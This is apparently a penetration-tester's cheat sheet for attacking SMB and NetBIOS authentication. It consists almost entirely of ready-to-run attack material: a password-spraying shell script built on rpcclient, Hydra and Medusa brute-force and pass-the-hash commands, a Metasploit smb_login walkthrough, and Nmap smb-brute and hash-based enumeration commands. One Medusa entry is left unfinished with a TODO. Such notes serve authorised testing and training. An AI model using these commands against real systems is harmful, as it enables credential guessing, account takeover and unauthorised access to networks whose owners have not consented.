# SMB & NETBIOS

## 01 - Manual

`$ cat password-spraying.sh`

---

```bash
#!/bin/sh

for username in `cat $1`
do
    echo -n "[*] user: $username" && rpcclient -U "$username%$2" -c "getusername;quit" $3
done
```

`$ chmod +x password-spraying.sh`

`$ ./password-spraying.sh users.txt <password> <IP>`

## 02 - Hydra

`$ hydra -U smb`

`$ hydra -l Administrator -p <password> smb://<IP>`

- Pass the Hash

`$ hydra -l <username> -p <ntlm_hash> -m "" <IP> smb`

`$ hydra -l <username> -p <lm_hash>:<nt_hash> <IP> -m "LocalHash" smb`

## 03 - Medusa

TODO: Show syntax for brute forcing SMB with Medusa

`$ medusa -u <username>`

- Pass the Hash

`$ medusa -u <username> -p <lm_hash>:<nt_hash> -h <IP> -M smbnt -m PASS:HASH`

## 04 - Metasploit

- You can actually use NTLM hashes to pass the hash

```
msf > use auxiliary/scanner/smb/smb_login

msf auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf auxiliary(scanner/smb/smb_login) > set user_file <username_dictionary_list>

msf auxiliary(scanner/smb/smb_login) > set pass_file <password_dictionary_list>

msf auxiliary(scanner/smb/smb_login) > set threads 8

msf auxiliary(scanner/smb/smb_login) > run
```

## 05 - Nmap

`$ nmap -p 445 --script smb-brute --script-args smbtype=<version> <IP>`

- Pass the Hash

`$ sudo nmap -p U:137,T:139 --script smb-enum-groups,smb-enum-users --script-args 'smbuser=<username>,smbhash=<nt_hash>' <IP>/<CIDR>`